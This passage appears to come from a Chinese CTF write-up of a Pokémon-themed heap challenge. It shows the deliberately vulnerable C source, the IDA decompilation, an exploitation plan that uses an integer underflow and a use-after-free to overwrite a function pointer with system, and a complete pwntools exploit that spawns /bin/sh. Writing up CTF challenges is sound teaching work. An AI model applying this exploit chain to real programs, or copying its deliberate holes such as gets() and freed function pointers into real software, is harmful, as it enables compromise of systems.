            gets(say);
            (*(void(*)(char*))ex1t[0])(say);
            break;
        case 666:
            puts("Why does technology make Pokémon?");
            struct pokemon* test;
            test=(struct pokemon*)malloc(sizeof(struct pokemon));
            read(0,&test->name[0],0x10);
            test->hp=1;
            test->speed=1;
            test->attack=1;
            test->defence=1;
            puts("It's so weak...");
            break;
        default:
            goto whilestart;
            break;
        }

        //收集数据
        //数据处理
        //绘制图像
    }
    return 0;
}

void Outmenu()
{
    puts("You walked into the Divine Beast Forest, hoping to meet the Divine Beast QWQ...");
    puts("There are two roads in front of you, choose the one on the left or the one on the right.");
    puts("1.left");
    puts("2.right");
    printf(">>>");
}
void Out(struct pokemon** mypoke)
{
    int choice=0;
    Outmenu();
    scanf("%d",&choice);
    switch (choice)
    {
        case 1:
            struct pokemon *QWQ;
            puts("You're very lucky, it's the Divine Beast QWQ that roars in front of you, let's grab it and knock it out first!");
            puts("QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~");
            QWQ=(struct pokemon*)malloc(sizeof(struct pokemon));
            QWQ->hp=MAXMAX;
            QWQ->speed=15;
            QWQ->defence=MAXMAX;
            QWQ->attack=MAXMAX;
            Pokemon_name(&QWQ,"QWQ");
            if(Fight(mypoke,QWQ)){
                puts("The soul of the mythical beast flew away...");
                free(ex1t);
            }else{
                puts("Loser...");
            }
            free(QWQ);
            break;
        default:
            struct pokemon *TAT;
            puts("You haven't encountered a beast, but you've encountered a TAT that guards the treasure, so try to stun it for some loot");
            puts("TAT: WTF!");
            TAT=(struct pokemon*)malloc(sizeof(struct pokemon));
            TAT->hp=MINMIN;
            TAT->speed=15;
            TAT->defence=MINMIN;
            TAT->attack=MINMIN;
            Pokemon_name(&TAT,"TAT");
            if(Fight(mypoke,TAT)){
                puts("Your earn some money~");
                money+=200;
            }else{
                puts("Loser...");
            }
            free(TAT);
            break;

    }
}
void Skillmenu()
{
    puts("When the battle begins, choose the skill you want to use");
    puts("1.Attack  2.Defence");
    puts("3.Escape  4.Surrender");
    printf(">>>");
}

int Fight(struct pokemon** mypoke,struct pokemon* emerypoke)
{
    int myspeed = (*mypoke)->speed;
    int emspeed = emerypoke->speed;
    int myhp=(*mypoke)->hp;
    int emhp=emerypoke->hp;
    int faster=0;
    while (1)
    {
        int choice=0;
        Skillmenu();
        scanf("%d",&choice);
        switch (choice)
        {
            case 1:
                //速度计算
                if(myspeed>emspeed){//我方速度比较快
                    myspeed -= emerypoke->speed;
                    faster=1;
                }else{
                    emspeed -= (*mypoke)->speed;
                    faster=0;
                }
                //攻击防御计算 //血量计算
                if(faster){
                    emhp = emhp - (((*mypoke)->attack/2)-(emerypoke->defence/3));
                }else{
                    myhp = myhp - ((emerypoke->attack/2)-((*mypoke)->defence/3));
                }
                myspeed+=(*mypoke)->speed;
                emspeed+=emerypoke->speed;
                
                if(myhp <= 0){
                    puts("Game Over :(");
                    return 0;
                }
                else if(emhp <= 0){
                    puts("Congratulations! You win!");
                    return 1;
                }
                break;

            case 2:
                if(emerypoke->attack > (*mypoke)->defence){
                    puts("Even if you defend, the other party still kills you in seconds");
                    return 0;
                }else{
                    puts("The defense succeeded, but nothing happened");
                }
                break;

            case 3:
                if(emerypoke->speed > (*mypoke)->speed){
                    puts("You're not fast enough to escape the fight");
                    return 0;
                }else{
                    puts("Escape!");
                    return 0;
                }
                break;

            case 4:
                return 0;
                break;
            
            default:
                break;
        }

    }
 
}

void Store(struct pokemon** mypoke)
{
    int choice=0;
    store_again:
    puts("I'm a merchant from GuanDu city, what do you want to buy?");
    puts("1.Attack agents");
    puts("2.Defensive agents");
    puts("3.Poké Ball");
    puts("4.EXIT");
    printf(">>>");
    scanf("%d",&choice);
    switch (choice)
    {
        case 1:
            money-=75;
            (*mypoke)->attack+=10;
            (*mypoke)->defence-=10;
            break;
        case 2:
            money-=75;
            (*mypoke)->attack-=10;
            (*mypoke)->defence+=10;
            break;
        case 3:
            money-=75;
            puts("Are you sure this is not a name change card?");
            char* newname=malloc(15);
            change++;
            //scanf("%15s",newname);
            //Pokemon_name(mypoke,newname);
            break;
        case 4:
            break;
        default:
        goto store_again;
            break;
    }
    puts("You say: f**king Black-hearted businessman");
}
void Status(struct pokemon** mypoke)
{
    printf("Your money: %d\n",money);
    puts("The status of your Pokémon is as follows");
    Pokemon_print(mypoke);
    puts("Over~");
    return ;
}
void Pokemon_print(struct pokemon** mypoke)
{
    printf("Pokemon name:%s\n",&(*mypoke)->name[0]);
    printf("Hp:%u\n",(*mypoke)->hp);
    printf("AT:%u\n",(*mypoke)->attack);
    printf("DE:%u\n",(*mypoke)->defence);
    printf("SP:%u\n",(*mypoke)->speed);
    return;
}

void Pokemon_name(struct pokemon** mypoke,char* str)
{
    for(int i=0;i<15;i++)
    {
        (*mypoke)->name[i]=str[i];
    }
}
void Start_choose(struct pokemon** mypoke)
{
    int choice=0;
    Start_choose_again:
    puts("Please choose a pokemon to follow you");
    puts("1.Pika!");
    puts("2.Little Fire Dragon!");
    puts("3.Wonderful frog seeds!");
    puts("4.Jenny Turtle!");
    printf(">>>");
    scanf("%d",&choice);
    switch (choice)
    {
        case 1:
            *mypoke = (struct pokemon*)malloc(sizeof(struct pokemon));
            (*mypoke)->hp=21;
            (*mypoke)->speed=16;
            (*mypoke)->defence=8;
            (*mypoke)->attack=14;
            Pokemon_name(mypoke,"Pikapi");
            break;
        case 2:
            *mypoke = (struct pokemon*)malloc(sizeof(struct pokemon));
            (*mypoke)->hp=25;
            (*mypoke)->speed=12;
            (*mypoke)->defence=14;
            (*mypoke)->attack=14;
            Pokemon_name(mypoke,"Charmander");
            break;
        case 3:
            *mypoke = (struct pokemon*)malloc(sizeof(struct pokemon));
            (*mypoke)->hp=31;
            (*mypoke)->speed=10;
            (*mypoke)->defence=11;
            (*mypoke)->attack=10;
            Pokemon_name(mypoke,"Bulbasaur");
            break;
        case 4:
            *mypoke = (struct pokemon*)malloc(sizeof(struct pokemon));
            (*mypoke)->hp=28;
            (*mypoke)->speed=9;
            (*mypoke)->defence=20;
            (*mypoke)->attack=9;
            Pokemon_name(mypoke,"Squirtle");
            break;
        
        default:
            goto Start_choose_again;
            break;
        }

}

void Mainmenu()
{
    puts("1.Store");
    puts("2.Out");
    puts("3.Status");
    puts("4.exit_the_world");
    printf(">>>");
}

void init()
{
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stderr, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);
    ex1t=(size_t*)malloc(sizeof(struct pokemon));
    size_t temp=&exit;
    memcpy(ex1t,&temp,8);
    return; 

}


void Start_print()
{
    puts(",-.----.                                           ____                         ");
    puts("\\    /  \\                  ,-.                   ,'  , `.                       ");
    puts("|   :    \\             ,--/ /|                ,-+-,.' _ |                       ");
    puts("|   |  .\\ :   ,---.  ,--. :/ |             ,-+-. ;   , ||   ,---.        ,---,  ");
    puts(".   :  |: |  '   ,'\\ :  : ' /             ,--.'|'   |  ;|  '   ,'\\   ,-+-. /  | ");
    puts("|   |   \\ : /   /   ||  '  /      ,---.  |   |  ,', |  ': /   /   | ,--.'|'   | ");
    puts("|   : .   /.   ; ,. :'  |  :     /     \\ |   | /  | |  ||.   ; ,. :|   |  ,\"' | ");
    puts(";   | |`-' '   | |: :|  |   \\   /    /  |'   | :  | :  |,'   | |: :|   | /  | | ");
    puts("|   | ;    '   | .; :'  : |. \\ .    ' / |;   . |  ; |--' '   | .; :|   | |  | | ");
    puts(":   ' |    |   :    ||  | ' \\ \'   ;   /||   : |  | ,    |   :    ||   | |  |/  ");
    puts(":   : :     \\   \\  / '  : |--' '   |  / ||   : '  |/      \\   \\  / |   | |--'   ");
    puts("|   | :      `----'  ;  |,'    |   :    |;   | |`-'        `----'  |   |/       ");
    puts("`---'.|              '--'       \\   \\  / |   ;/                    '---'        ");
    puts("  `---`                          `----'  '---'                                                                                                     ");
    puts("Welcome to my Pokémon World, where you are now in the small town of Kinan, where people and elves get along in harmony! Hey! Your dream is to collect the world's most famous mythical QWQ, come on adventurers, and embark on your adventure!");

}
                                                                 
```

### 0x1 逆向
checksec查看保护，全保护，将就着看吧。

![](/images/7089f5c7ea08f43f7818a3ed31633c9d.png)

拖进ida分析，此时要先看init函数，因为里面可能藏了点东西，ex1t是一个指针，分配了一个chunk给它。

然后给堆上内存赋值exit的地址。

```c
unsigned __int64 init()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  ex1t = malloc(0x20uLL);
  *(_QWORD *)ex1t = &exit;
  return v1 - __readfsqword(0x28u);
}
```

来到main函数

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-44h] BYREF
  _BYTE v5[8]; // [rsp+10h] [rbp-40h] BYREF
  void *buf; // [rsp+18h] [rbp-38h]
  _BYTE v7[40]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+48h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  Start_print();
  Start_choose(v5);
  puts("You open the Starter Pack and get a hundred coins");
  money += 100;
  printf("gift:%p\n", &puts);
  while ( money >= 0 )
  {
    Mainmenu();
    __isoc99_scanf("%d", &v4);
    if ( v4 == 666 )
    {
      puts(aWhyDoesTechnol);
      buf = malloc(0x20uLL);
      read(0, buf, 0x10uLL);
      *((_DWORD *)buf + 4) = 1;
      *((_DWORD *)buf + 6) = 1;
      *((_DWORD *)buf + 5) = 1;
      *((_DWORD *)buf + 7) = 1;
      puts("It's so weak...");
    }
    else if ( v4 <= 666 )
    {
      if ( v4 == 4 )
      {
        puts("\nWhat you want to say?");
        gets(v7);
        (*(void (__fastcall **)(_BYTE *))ex1t)(v7);
      }
      else if ( v4 <= 4 )
      {
        switch ( v4 )
        {
          case 3:
            Status(v5);
            break;
          case 1:
            Store(v5);
            break;
          case 2:
            Out(v5);
            break;
        }
      }
    }
  }
  puts("No money, you out:(");
  return 0;
}
```

**有个菜单，开局还送libc地址，这怎么输？**

但是首先会先让你选精灵，money+=100，之后，就可以根据菜单去做题了。

```c
int Mainmenu()
{
  puts("1.Store");
  puts("2.Out");
  puts("3.Status");
  puts("4.exit_the_world");
  return printf(">>>");
}
```

### Start_choose函数
开局选精灵

```c
puts("Please choose a pokemon to follow you");
puts("1.Pika!");
puts("2.Little Fire Dragon!");
puts("3.Wonderful frog seeds!");
puts("4.Jenny Turtle!");
```

这里不急，我们往下面分配内存的代码看。

无论选什么都会分配0x20（实际上是0x20+0x10，具体请看ctfwiki堆概况章节）的堆块，这里我们并不知道每一个的意思，但是猜出这是一个结构体，和精灵有关，最有可能想到的是精灵的属性，想不到也不用管。

```c
unsigned __int64 __fastcall Start_choose(__int64 a1)
{
  int v2; // [rsp+14h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v2 = 0;
  while ( 1 )
  {
    puts("Please choose a pokemon to follow you");
    puts("1.Pika!");
    puts("2.Little Fire Dragon!");
    puts("3.Wonderful frog seeds!");
    puts("4.Jenny Turtle!");
    printf(">>>");
    __isoc99_scanf("%d", &v2);
    if ( v2 == 4 )
      break;
    if ( v2 <= 4 )
    {
      switch ( v2 )
      {
        case 3:
          *(_QWORD *)a1 = malloc(0x20uLL);
          *(_DWORD *)(*(_QWORD *)a1 + 16LL) = 31;
          *(_DWORD *)(*(_QWORD *)a1 + 24LL) = 10;
          *(_DWORD *)(*(_QWORD *)a1 + 28LL) = 11;
          *(_DWORD *)(*(_QWORD *)a1 + 20LL) = 10;
          Pokemon_name(a1, "Bulbasaur");
          return v3 - __readfsqword(0x28u);
        case 1:
          *(_QWORD *)a1 = malloc(0x20uLL);
          *(_DWORD *)(*(_QWORD *)a1 + 16LL) = 21;
          *(_DWORD *)(*(_QWORD *)a1 + 24LL) = 16;
          *(_DWORD *)(*(_QWORD *)a1 + 28LL) = 8;
          *(_DWORD *)(*(_QWORD *)a1 + 20LL) = 14;
          Pokemon_name(a1, "Pikapi");
          return v3 - __readfsqword(0x28u);
        case 2:
          *(_QWORD *)a1 = malloc(0x20uLL);
          *(_DWORD *)(*(_QWORD *)a1 + 16LL) = 25;
          *(_DWORD *)(*(_QWORD *)a1 + 24LL) = 12;
          *(_DWORD *)(*(_QWORD *)a1 + 28LL) = 14;
          *(_DWORD *)(*(_QWORD *)a1 + 20LL) = 14;
          Pokemon_name(a1, "Charmander");
          return v3 - __readfsqword(0x28u);
      }
    }
  }
  *(_QWORD *)a1 = malloc(0x20uLL);
  *(_DWORD *)(*(_QWORD *)a1 + 16LL) = 28;
  *(_DWORD *)(*(_QWORD *)a1 + 24LL) = 9;
  *(_DWORD *)(*(_QWORD *)a1 + 28LL) = 20;
  *(_DWORD *)(*(_QWORD *)a1 + 20LL) = 9;
  Pokemon_name(a1, "Squirtle");
  return v3 - __readfsqword(0x28u);
}
```

#### case1 ：Store
是一个商店，卖攻击药剂和防御药剂还有精灵球，买精灵球会有change++，猜测是改名机会。

防御剂是攻击下降，防御上升。攻击剂是攻击上升，防御下降。

攻击是a1+20

防御是a1+28

```c
unsigned __int64 __fastcall Store(__int64 a1)
{
  int v2; // [rsp+1Ch] [rbp-14h] BYREF
  void *v3; // [rsp+20h] [rbp-10h]
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  while ( 1 )
  {
    puts("I'm a merchant from GuanDu city, what do you want to buy?");
    puts("1.Attack agents");
    puts("2.Defensive agents");
    puts(a3Pok);
    puts("4.EXIT");
    printf(">>>");
    __isoc99_scanf("%d", &v2);
    if ( v2 == 4 )
      break;
    if ( v2 <= 4 )
    {
      switch ( v2 )
      {
        case 3:
          money -= 75;
          puts("Are you sure this is not a name change card?");
          v3 = malloc(0xFuLL);
          ++change;
          goto LABEL_11;
        case 1:
          money -= 75;
          *(_DWORD *)(*(_QWORD *)a1 + 20LL) += 10;
          *(_DWORD *)(*(_QWORD *)a1 + 28LL) -= 10;
          goto LABEL_11;
        case 2:
          money -= 75;
          *(_DWORD *)(*(_QWORD *)a1 + 20LL) -= 10;
          *(_DWORD *)(*(_QWORD *)a1 + 28LL) += 10;
          goto LABEL_11;
      }
    }
  }
LABEL_11:
  puts("You say: f**king Black-hearted businessman");
  return v4 - __readfsqword(0x28u);
}
```

#### case 2 : out
外出函数，分析下来就是左转遇到小精灵能够赚钱，右转遇到神兽，打赢了就会free掉一个（ex1t所在的）chunk。

```c
unsigned __int64 __fastcall Out(__int64 a1)
{
  int v2; // [rsp+1Ch] [rbp-14h] BYREF
  void *ptr; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+28h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v2 = 0;
  Outmenu();
  __isoc99_scanf("%d", &v2);
  if ( v2 != 1 )
  {
    puts(
      "You haven't encountered a beast, but you've encountered a TAT that guards the treasure, so try to stun it for some loot");
    puts("TAT: WTF!");
    ptr = malloc(0x20uLL);
    *((_DWORD *)ptr + 4) = 1;
    *((_DWORD *)ptr + 6) = 15;
    *((_DWORD *)ptr + 7) = 1;
    *((_DWORD *)ptr + 5) = 1;
    Pokemon_name(&ptr, "TAT");
    if ( (unsigned int)Fight(a1, ptr) )
    {
      puts("Your earn some money~");
      money += 200;
      goto LABEL_8;
    }
LABEL_7:
    puts("Loser...");
    goto LABEL_8;
  }
  puts("You're very lucky, it's the Divine Beast QWQ that roars in front of you, let's grab it and knock it out first!");
  puts("QWQ: qwq~ qwq~ qwq~ qwq~ qwq~ qwq~");
  ptr = malloc(0x20uLL);
  *((_DWORD *)ptr + 4) = 9999;
  *((_DWORD *)ptr + 6) = 15;
  *((_DWORD *)ptr + 7) = 9999;
  *((_DWORD *)ptr + 5) = 9999;
  Pokemon_name(&ptr, "QWQ");
  if ( !(unsigned int)Fight(a1, ptr) )
    goto LABEL_7;
  puts("The soul of the mythical beast flew away...");
  free(ex1t);
LABEL_8:
  free(ptr);
  return v4 - __readfsqword(0x28u);
}
```

这里用到了Fight函数让两个精灵进行决斗。

Fight函数里面选攻击就好了(就不逆向了，都是一些实现蘸豆的逻辑)，但是你要速度快并且一刀能打死QWQ。

#### case 3 : Status
对当前状况进行查看

```c
int __fastcall Status(__int64 a1)
{
  printf("Your money: %d\n", money);
  puts(aTheStatusOfYou);
  Pokemon_print(a1);
  return puts("Over~");
}
```

#### case 4 : ex1t
使用了函数指针执行退出函数，并且能够控制第一个参数

```c
if ( v4 == 4 )
{
  puts("\nWhat you want to say?");
  gets(v7);
  (*(void (__fastcall **)(_BYTE *))ex1t)(v7);
}
```

#### case 666 : gift
会分配一个0x20大小的堆，并且能够改写一部分内存。

```c
if ( v4 == 666 )
{
  puts(aWhyDoesTechnol);
  buf = malloc(0x20uLL);
  read(0, buf, 0x10uLL);
  *((_DWORD *)buf + 4) = 1;
  *((_DWORD *)buf + 6) = 1;
  *((_DWORD *)buf + 5) = 1;
  *((_DWORD *)buf + 7) = 1;
  puts("It's so weak...");
}
```

### 0x2 思路
**开局给了libc地址，这怎么输？**

```plain
ptr = malloc(0x20uLL);
*((_DWORD *)ptr + 4) = 9999;
*((_DWORD *)ptr + 6) = 15;
*((_DWORD *)ptr + 7) = 9999;
*((_DWORD *)ptr + 5) = 9999;
Pokemon_name(&ptr, "QWQ");
```

简单观察神兽只有这项属性 *((_DWORD *)ptr + 6) = 15最低，*ptr是我们堆刚开始的地方

这里Dword是4字节，所以也就是ptr+6*4=ptr+24

我们选精灵的时候，要选这个属性大于QWQ的，才有可能取得胜利。

也就是我们的Pikapi！

![](/images/db7d02e1944c898b63ea2b2b59ae3e70.png)

在FIght函数逻辑中，有以下片段，这里其实都是通过计算精灵的属性值，来实现蘸豆。我们不妨设想一下，它们中很有可能就包含精灵的攻击属性和防御属性。虽有大部分都是int类型，但是实际上是无符号类型在运算

> `<font style="color:rgb(77, 77, 77);">*(_QWORD *)</font>` 允许你在不知道原始数据类型的情况下，以特定的方式（这里是64位无符号整数）解释和访问内存中的数据。
>

![](/images/4348157c9f634fb8dcb3333581392cf0.png)

所以我们选取皮卡丘，在打败两次小怪之后，买防御剂，让自己的攻击溢出到负数，但是比较用的是Qword所以实际上还是unsigned int，此时速度比QWQ快，能够一击秒杀QWQ。这样会free掉特殊堆块，利用case666，然后申请两次申请回特殊堆块（因为第一次是QWQ的堆块。），之后改写ex1t的hook为system即可getshell。

free掉的两个堆块进入bin

![](/images/81ffec354bc26baebd294d557b635307.png)

### 0X3 exp
```plain
from pwn import *
context(log_level="debug")
p=process("./pokemon_master")
#p=remote("43.248.97.213",30058)
def cmd(i):
    p.sendlineafter(">>>",str(i))



#choose pikapi
cmd(1)

#recv libcaddr
p.recvuntil("gift:0x")
puts_addr=int(p.recv(12)[-12:].rjust(16,b'0'),16)
print("puts",hex(puts_addr))
libcbase=puts_addr-0x080e50
system=libcbase+0x050d70

#attack TAT
cmd(2)
cmd(2)
cmd(1)

#buy defense agents
cmd(1)
cmd(2)
cmd(1)
cmd(2)
cmd(3)
#gdb.attach(p)
#attack QWQ
cmd(2)
cmd(1)
cmd(1)

#one gadgte
one=[0x50a47+libcbase,0xebc81+libcbase,0xebc85+libcbase,0xebc88+libcbase]

#CMD 666 backdoor
cmd(666)
p.sendline(p64(system))
cmd(666)
p.sendline(p64(system))
print("libcbase",hex(libcbase))
#gdb.attach(p,"b *$rebase(0x137b)")
cmd(4)
p.sendline("/bin/sh\x00")

p.interactive()
```

